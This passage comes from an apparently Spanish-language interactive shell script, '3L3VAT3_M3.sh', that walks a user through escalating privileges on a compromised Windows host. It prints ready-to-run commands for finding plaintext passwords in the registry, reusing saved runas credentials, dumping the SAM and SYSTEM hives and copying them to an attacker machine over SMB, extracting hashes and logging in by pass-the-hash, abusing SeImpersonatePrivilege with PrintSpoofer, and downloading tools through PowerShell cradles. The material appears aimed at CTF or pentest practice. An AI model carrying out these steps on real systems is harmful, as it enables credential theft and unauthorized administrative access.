        echo "> Comandos:"
	echo "> Enumerar HKCU: reg query /f password /t REG_Z /s"
	echo ">"
	echo "> Enumerar HKLM: reg query /t REG_SZ /s"
	echo ">"
	echo "> Tras ejecutar el comando, si disponibles, se veran credenciales en texto plano en el output"
	echo ">"
        echo "***"
        echo "------ESPERO HABER SIDO DE AYUDA!!-------"
        echo "***"
		read -p "Si este metodo no ha funcionado, quieres probar otra tecnica? Recuerda que tienes el metodo 1.(Si/No/1): " metodo2
                if [ "$metodo2" == "Si" ];then
                echo "***"
                echo "---------Volvamos a empezar----------"
                echo "***"
                ./3L3VAT3_M3.sh
                   :
                elif [ "$metodo2" == "No" ];then
                echo ""
                echo " ESPERO HABERTE SIDO DE AYUDA!!!! "
                echo "     ***D0NT-G1V3_UP*** "
		   :
		elif [ "$metodo2" == "1" ];then
		echo ""
        	echo "-----M-3-T-0-D-0-1-----"
        	echo ">"
        	echo "> Comando:"
        	echo '> reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"'
        	echo ">"
        	echo "> Tras ejecutar este comando, si disponibles, se veran credenciales en texto plano al final del output"
        	echo ">"
        	echo "***"
        	echo "------ESPERO HABER SIDO DE AYUDA!!-------"
        	echo "***"
			read -p "Si no has encontrado nada quieres probar otra tecnica(Si/No): " vuelta6
                        if [ "$vuelta6" == "Si" ];then
                        echo ""
                        echo "***D0NT-G1V3_UP***"
                        ./3L3VAT3_M3.sh
                           :
                        elif [ "$vuelta6" == "No" ];then
                        echo ""
                        echo "***TRY-HARD3R***"
                           :
                        else
                        echo ""
			echo "***"
                        echo "Por favor facilita un input valido"
                        echo "***"
			./3L3VAT3_M3.sh

                        fi
                   :
                else
                echo ""
		echo "***"
                echo ">Porfavor facilita un input valido"
                echo "***"
		./3L3VAT3_M3.sh

                fi
	   :
	else
	echo ""
	echo "***"
        echo "Por favor facilita un input valido"
        echo "***"
        ./3L3VAT3_M3.sh

	fi

fi

if test $input == $Credenciales_runas;then

echo "----------------0==r-------------------"
echo "---P-A-5-5-W-0-R-D-5"
echo "         ---R-U-N__A-5---"
echo "                  ---0-R__-F-A-5-T-----"
echo "1amwh0----------0==r-------------------"
echo ""
echo ">Esta tecnica aprovecha credenciales almacenadas en el sistema utilizadas por el comando 'runas'."
echo ">Usuarios con privilegios elevados deberian tener mas cuidado dando a recordar credenciales..."
echo ">o tener mejor memoria..... o no ser tan vagos..."
echo ">"
echo ">Ejecuta el siguiente comando para revisar si el equipo dispone de credenciales guardadas"
echo ">Comando:"
echo "> cmdkey /list"
echo ">"
echo ">Si hubiese credenciales disponibles obtendriamos un output similar al siguiente:"
echo ">"
echo ">		Destino: Domain:interactive=DESKTOP-BCRG94M\administrador"
echo ">		Tipo: Contrasena de dominio"
echo ">		Usuario: DESKTOP-BCRG94M\administrador"
echo ">"
echo ">"
	echo "??????????"
	read -p "Has encontrado credenciales almacenadas de un usuario con privilegios altos?(Si/No): " encontrado
	echo "??????????"
	if [ "$encontrado" == "Si" ];then
	echo ""
	echo "> Genial, prueba a ejecutar una cmd como el usuario, utiliza el siguiente comando:"
	echo ">"
	echo ">Comando:"
	echo ">"
	echo "> runas /savecred /user:nombre_usuario C:\Windows\System32\cmd.exe"
	echo ">"
	echo ">"
	echo "***"
        echo "------ESPERO HABER SIDO DE AYUDA!!-------"
        echo "***"
	   :
	elif [ "$encontrado" == "No" ];then
	echo ""
	echo "***"
        echo "---Mmmmm... Parece que por aqui no puedes continuar---"
        echo "***"
		read -p "Si no has encontrado nada quieres probar otra tecnica(Si/No): " vuelta7
                        if [ "$vuelta7" == "Si" ];then
                        echo ""
                        echo "***D0NT-G1V3_UP***"
                        ./3L3VAT3_M3.sh
                           :
                        elif [ "$vuelta7" == "No" ];then
                        echo ""
                        echo "***TRY-HARD3R***"
                           :
                        else
                        echo ""
			echo "***"
                        echo "Por favor facilita un input valido"
                        echo "***"
			./3L3VAT3_M3.sh

                        fi
	   :
	else
	echo ""
	echo "***"
	echo "Por favor facilita un input valido"
	echo "***"
	./3L3VAT3_M3.sh

	fi


fi

if test $input == $SAM_Security_Account_Manager;then

echo ""
echo "----------------0==r------------------"
echo "     -M-Y -N-A-M-3 1-5 -W-H-A-T-"
echo "	      -5-A-M__-5-Y-5-T-3-M-"
echo "----------------0==r------------1amwh0"
echo ""
echo ">Esta tecnica se aprovecha de credenciales guardadas en los archivos SYSTEM & SAM por el Security Account Manager de Windows"
echo ">El archivo SAM contiene una lista de hashes en formato NTLM los cuales son usados cada vez que el usuario inicia sesion, comparando"
echo ">las credenciales facilitadas con el hash, si coinciden acceso garantizado!"
echo ">EL archivo SYSTEM contiene el bootkey para decodificar el archivo SAM y asi obtener los hashes en texto plano"
echo ">"
echo ">Estos archivos normalmente se encuentran la siguiente ruta:"
echo ">"
echo "> C:\Windows\System32\Config"
echo ">"
echo ">Sin embargo estos estan restringidos y requieren de permisos de administrador. Si nuestro usuario dispone del privilegio"
echo ">SeBackupPrivilege, puede que podamos conseguir hacernos con SAM y SYSTEM"
echo ">"
echo ">Adicionalmente, puede ser que un backup de estos este disponible en algun sitio donde el usuario tenga mas permisos"
echo ">"
echo ">"
echo ">Prueba a copiar los archivos en el directorios en el que te encuentras, asegurate de tener permisos de escritura"
echo ">"
echo ">Comandos"
echo ">"
echo "> reg save HKLM\system system"
echo "> reg save HKLM\sam sam"
echo""
	read -p "Vamos a revisar si puedes usar esta tecnica o no.(comprobar/No)" tecnica
        if [ "$tecnica" == "comprobar" ];then
        echo ""
        echo ">Revisa que el usuario tiene los privilegios adecuados:"
        echo ">"
        echo ">Comando: whoami /priv"
        echo ">Output debe contener: SeBackupPrivilege"
        echo ">"
        echo ">"
        echo ">Recuerda que los archivos pueden estar en una ruta no comun, si el ususario no dispone de privilegios sobre la ruta standard,"
        echo ">enumera bien la maquina!"
        echo ""
		read -p "Has conseguido copiar los archivos? Comprueba listando el contenido del directorio en el que estas(Si/No): " comprueba
                if [ "$comprueba" == "Si" ];then
		echo ""
                echo "-------------------------------------------"
                echo "|                                         |"
                echo "|         PROCESO DE EJECUCION            |"
                echo "|                  &                      |"
                echo "|             EXPLOTACION                 |"
                echo "|                                         |"
                echo "-------------------------------------------"
                echo ">"
		echo ">Recuerda"
		echo ">Comandos para hacer una copia de los archivos"
		echo ">"
		echo "> reg save HKLM\system system"
		echo "> reg save HKLM\sam sam"
		echo ">"
                echo ">1)Pasa los archivos SAM y SYSTEM a tu Kali/Maquina"
                echo ">"
                echo ">KALI: Levanta un servidor SMB"
                echo ">"
                echo ">Comando: impacket-smbclient Carpeta Ruta/de/la/carpeta"
                echo ">Ejemplo: impacket-smbclient MATRIX /home/vagrant/MATRIX"
                echo ">"
                echo ">"
                echo ">WINDOWS: Envia los archivos"
                echo ">"
                echo "> copy C:\Ruta\a\system \\kali_ip\carpeta"
                echo "> copy C:\Ruta\a\sam \\kali_ip\carpeta"
                echo ">"
                echo ">Ejemplo: copy C:\Windows\System32\Config\system \\10.0.2.2\MALICIOUS"
                echo ">"
                echo ">"
                echo ">2)Extraer los hashes con sam2dump"
                echo ">Link: https://www.kali.org/tools/samdump2/"
                echo ">"
                echo ">Importante, para que la herramienta funcione, debes presentar los archivos en el siguiente orden: SYSTEM SAM"
                echo ">"
                echo ">Comando: samdump2 SYSTEM SAM"
                echo ">"
                echo ">Ahora deberias de tener los hashes en texto plano, con suerte el de administrador."
                echo ">"
                echo ">Puedes hacer uso de la siguiente herramienta para realizar un pass de hash y hacerte pasar por administrador."
                echo ">Esto es un ejemplo, modificalo segun tus condiciones"
                echo ">"
                echo ">Comando: evil-winrm 10.10.250.47 -u Administrador -H 24j3frd23fv676h655adsdse3f4f444f"
                echo ">"
                echo "***"
                echo "------ESPERO HABER SIDO DE AYUDA!!-------"
                echo "***"
		   :
		elif [ "$comprueba" == "No" ];then
		echo ""
                echo "***"
                echo "---Mmmmm... Parece que por aqui no puedes continuar, revisa que has ejecutado correctamente los comandos y enumerado bien la maquina---"
                echo "***"
			read -p "Si no has encontrado nada quieres probar otra tecnica(Si/No)?: " vuelta7
                        if [ "$vuelta7" == "Si" ];then
                        echo ""
                        echo "***D0NT-G1V3_UP***"
                        ./3L3VAT3_M3.sh
                           :
                        elif [ "$vuelta7" == "No" ];then
                        echo ""
                        echo "***TRY-HARD3R***"
                           :
                        else
                        echo ""
			echo "***"
                        echo "Por favor facilita un input valido"
			echo "***"
                        ./3L3VAT3_M3.sh

                        fi
		   :
		else
		echo ""
                echo "***"
                echo "Por favor facilita un input valido"
                echo "***"
                ./3L3VAT3_M3.sh

		fi
	   :
	elif [ "$tecnica" == "No" ];then
	echo ""
		read -p "Quieres pasar directamente a intetnar escalar privilegios?(Si/No): " salto
		if [ "$salto" == "Si" ];then
		echo ""
		echo "***"
		echo "No te lo recomiendo pero bueno...seguro que puedes con ello"
		echo ""
		echo "-------------------------------------------"
                echo "|                                         |"
                echo "|         PROCESO DE EJECUCION            |"
                echo "|                  &                      |"
                echo "|             EXPLOTACION                 |"
                echo "|                                         |"
                echo "-------------------------------------------"
                echo ">"
		echo ">Recuerda"
                echo ">Comandos para hacer una copia de los archivos"
                echo ">"
                echo "> reg save HKLM\system system"
                echo "> reg save HKLM\sam sam"
                echo ">"
                echo ">1)Pasa los archivos SAM y SYSTEM a tu Kali/Maquina"
                echo ">"
                echo ">KALI: Levanta un servidor SMB"
                echo ">"
                echo ">Comando: impacket-smbclient Carpeta Ruta/de/la/carpeta"
                echo ">Ejemplo: impacket-smbclient MATRIX /home/vagrant/MATRIX"
                echo ">"
                echo ">"
                echo ">WINDOWS: Envia los archivos"
                echo ">"
                echo "> copy C:\Ruta\a\system \\kali_ip\carpeta"
                echo "> copy C:\Ruta\a\sam \\kali_ip\carpeta"
                echo ">"
                echo ">Ejemplo: copy C:\Windows\System32\Config\system \\10.0.2.2\MALICIOUS"
                echo ">"
                echo ">"
                echo ">2)Extraer los hashes con sam2dump"
                echo ">Link: https://www.kali.org/tools/samdump2/"
                echo ">"
                echo ">Importante, para que la herramienta funcione, debes presentar los archivos en el siguiente orden: SYSTEM SAM"
                echo ">"
                echo ">Comando: samdump2 SYSTEM SAM"
                echo ">"
                echo ">Ahora deberias de tener los hashes en texto plano, con suerte el de administrador."
                echo ">"
                echo ">Puedes hacer uso de la siguiente herramienta para realizar un pass de hash y hacerte pasar por administrador."
                echo ">Esto es un ejemplo, modificalo segun tus condiciones"
                echo ">"
                echo ">Comando: evil-winrm 10.10.250.47 -u Administrador -H 24j3frd23fv676h655adsdse3f4f444f"
                echo ">"
                echo "***"
                echo "------ESPERO HABER SIDO DE AYUDA!!-------"
                echo "***"
		   :
		elif [ "$salto" == "No" ];then
		echo ""
		echo "***"
		echo "----De Vuelta al principio----"
		echo "***"
		./3L3VAT3_M3.sh
		   :
		else
		echo ""
        	echo "***"
        	echo "Por favor facilita un input valido"
        	echo "***"
        	./3L3VAT3_M3.sh

        	fi
	   :
	else
        echo ""
        echo "***"
        echo "Por favor facilita un input valido"
        echo "***"
        ./3L3VAT3_M3.sh

        fi

fi

#
if test $input == $PrintSpoofer;then

echo ""
echo "--P-------------------5--"
echo "---R-----------------P---"
echo "----1---------------0----"
echo "-----N-------------0-----"
echo "------T-----------F------"
echo "-----------------3-------"
echo "----------------R 1amwh0 "
echo ""
echo ""
echo ">Printspoofer aprovecha el privilegio SeImpersonatePrivilege para invocar un proceso con el token del administrador del sistema,"
echo "> consiguiendo elevar privilegios rapidamente"
echo ">"
echo ">Antes de empezar debes asegurarte de que tienes este privilegio."
echo ">Ejecuta el siguiente comando"
echo ">"
echo ">Comando: whoami /priv"
echo ""
	read -p "Dispones de este privilegio?(Si/No): " privis
	if [ "$privis" == "Si" ];then
	echo ""
	echo ""
	echo "Y0U AR3 NEARLY ADMIN BASICALLY"
	echo ""
	echo "-------------------------------------------"
        echo "|                                         |"
        echo "|         PROCESO DE EJECUCION            |"
        echo "|                  &                      |"
        echo "|             EXPLOTACION                 |"
        echo "|                                         |"
        echo "-------------------------------------------"
	echo ">"
	echo ">1)Si no lo tienes necesitas descargarte/copiar el script PrintSpoofer,"
	echo ">Importante: descarga la version adecuada dependiendo de la arquitectura del host"
	echo ">"
	echo ">Link: https://github.com/itm4n/PrintSpoofer"
	echo ">Link(x64): https://github.com/itm4n/PrintSpoofer/releases"
	echo ">"
	echo ">una vez lo tengas, pasamos a la fase 2"
	echo ">"
	echo "2)Sube la version de PrintSpoofer correspondiente al host windows"
	echo ">"
	echo ">KALI:"
	echo ">Levanta un servidor http con python"
	echo ">"
	echo "> python3 -m http.server 8000 "
	echo ">"
	echo ">WINDOWS:"
	echo "> Desde la terminal con acceso a la maquina comprometida o en una cmd dentro de la maquina comprometida,"
        echo "> sube PrintSpoofer (en un directorio donde puedas escribir!)."
        echo ">"
        echo "> Utiliza uno de los siguientes comandos"
        echo ">------------------------------"
        echo ">         COMANDOS             "
        echo ">______________________________"
        echo ">*****************************************************************************************************************************"
        echo "> powershell -c wget \"http://tu_ip:8000/nombre_del_archivo.exe\" -outfile \"nombre_del_archivo.exe\"                        |"
        echo ">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -"
        echo "> powershell \"(New-Object System.Net.WebClient).Downloadfile('http://tu_ip:8000/nombre_archivo.exe','nombre_archivo.exe')\" |"
        echo ">*****************************************************************************************************************************"
        echo ">"
        echo "> Confirma que el upload se ha realizado correctamente listando el directorio en el que has metido PrintSpoofer"
        echo ">"
	echo ">"
	echo "3)Ejecuta PrintSpoofer y disfruta de tus nuevos privilegios"
	echo ">"
	echo ">Comando: (Ten en encuenta la version requerida, esto es un ejemplo!"
	echo ">"
	echo "> PrintSpoofer.exe -i -c cmd"
	echo ">"
	echo ">"
	echo "***"
        echo "------ESPERO HABER SIDO DE AYUDA!!-------"
        echo "***"
	   :
	elif [ "$privis" == "No" ];then
	echo ""
	echo ""
        echo "***"
        echo "---Mmmmm... Parece que por aqui no puedes continuar---"
        echo "***"
                read -p "Quieres probar otra tecnica(Si/No): " vuelta9
		echo "***"
                if [ "$vuelta9" == "Si" ];then
                echo ""
                echo "***D0NT-G1V3_UP***"
                ./3L3VAT3_M3.sh
                    :
                elif [ "$vuelta9" == "No" ];then
                echo ""
                echo "***TRY-HARD3R***"
                     :
                else
                echo ""
		echo "***"
                echo "Por favor facilita un input valido"
		echo "***"
                ./3L3VAT3_M3.sh

                fi

	   :
	else
	echo ""
        echo "***"
        echo "Por favor facilita un input valido"
        echo "***"
        ./3L3VAT3_M3.sh

        fi

fi

if test $input == $Herramientas_Automatizadas;then

echo ""
echo "------------------------------"
echo "----/\-- |  | -----  ----     "
echo "---/  \  |__|   |    |__|     "
echo ""
echo "-- ---- ----  ---- |    ---"
echo "--  |   |__|  |__| |__  |__"
echo "--                       __|"
echo "--  1amwh0 -----------------"
echo ""
echo ""
echo "Una buena enumeracion de sistema y usuario es crucial a la hora de obtener informacion privilegiada o que pudiese"
echo "revelar posibles vectores de ataque para realizar una escalada de privilegios exitosa"
echo ""
echo "A continuacion se facilitan links de descarga y guia de uso dos herramientas las cuales te ayudaran con una enumeracion completa del host"
echo ""
echo ""
	read -p "Cual te gustaria probar? winpeas/powerup: " probar
	if [ "$probar" == "winpeas" ];then
	echo "***"
	echo "-----W-1-N-P-3-A-5-----"
	echo "***"
	echo ""
	echo ">DOWNLOAD LINK"
	echo ">"
	echo ">https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASexe"
	echo ">"
	echo ">"
	echo ">COMO USAR"
	echo ">"
	echo ">1)Una vez tengas la herramienta guardada en tu maquina, levanta un servidor http con python."
	echo ">"
	echo "> python3 -m http.server 8000"
	echo ">"
	echo ">2)En la maquina victima copia el archivo usando powershell, te recomiendo un directorio como C:\Windows\Temp:"
	echo ">ya que tinese que tener permisos de escritura en el directorio"
	echo ""
	echo "> Utiliza uno de los siguientes comandos"
        echo ">------------------------------"
        echo ">         COMANDOS             "
        echo ">______________________________"
        echo ">*****************************************************************************************************************************"
        echo "> powershell -c wget \"http://tu_ip:8000/nombre_del_archivo.exe\" -outfile \"nombre_del_archivo.exe\"                        |"
        echo ">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -"
        echo "> powershell \"(New-Object System.Net.WebClient).Downloadfile('http://tu_ip:8000/nombre_archivo.exe','nombre_archivo.exe')\" |"
        echo ">*****************************************************************************************************************************"
        echo ">"
        echo "> Confirma que el upload se ha realizado correctamente listando el directorio en el que has ejecutado el comando"
	echo ">"
	echo ">3) Ejecuta la herramienta:"
	echo ">"
	echo ">EJEMPLO:"
	echo ">"
	echo ">C:\Windows\Temp>WinPeasx86.exe"
	echo ">"
        echo ">"
        echo "***"
        echo "------ESPERO HABER SIDO DE AYUDA!!-------"
        echo "***"
	   :
	elif [ "$probar" == "powerup" ];then
	echo ""
	echo "***"
	echo ">----P-0-W-3-R_U-P-----"
	echo "***"
	echo ">"
	echo ">DOWNLOAD LINK"
        echo ">"
        echo ">https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1"
        echo ">"
        echo ">"
        echo ">COMO USAR"
        echo ">"
        echo ">1)Una vez tengas la herramienta guardada en tu maquina, levanta un servidor http con python."
        echo ">"
        echo "> python3 -m http.server 8000"
        echo ">"
        echo ">2)En la maquina victima copia el archivo usando powershell, te recomiendo un directorio como C:\Windows\Temp:"
        echo ">ya que tinese que tener permisos de escritura en el directorio"
        echo ""
        echo "> Utiliza uno de los siguientes comandos"
        echo ">------------------------------"
        echo ">         COMANDOS             "
        echo ">______________________________"
        echo ">*****************************************************************************************************************************"
        echo "> powershell -c wget \"http://tu_ip:8000/nombre_del_archivo.exe\" -outfile \"nombre_del_archivo.exe\"                        |"
        echo ">- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -"
        echo "> powershell \"(New-Object System.Net.WebClient).Downloadfile('http://tu_ip:8000/nombre_archivo.exe','nombre_archivo.exe')\" |"
        echo ">*****************************************************************************************************************************"
        echo ">"
	echo ">"
	echo "> Confirma que el upload se ha realizado correctamente listando el directorio en el que has ejecutado el comando"
        echo ">"
        echo ">3) Ejecuta la herramienta:"
        echo ">"
        echo ">EJEMPLO:"
        echo ">"
        echo ">C:\Windows\Temp>powershell"
	echo ">C:\Windows\Temp>.\Powerup.ps1"
	echo ">"
	echo ">GUIA DE USO:"
	echo ">"
	echo ">https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/README.md"
        echo ">"
        echo ">"
        echo "***"
        echo "------ESPERO HABER SIDO DE AYUDA!!-------"
        echo "***"
	   :
	else
	echo ""
        echo "***"
        echo "Por favor facilita un input valido"
        echo "***"
        ./3L3VAT3_M3.sh

        fi


fi

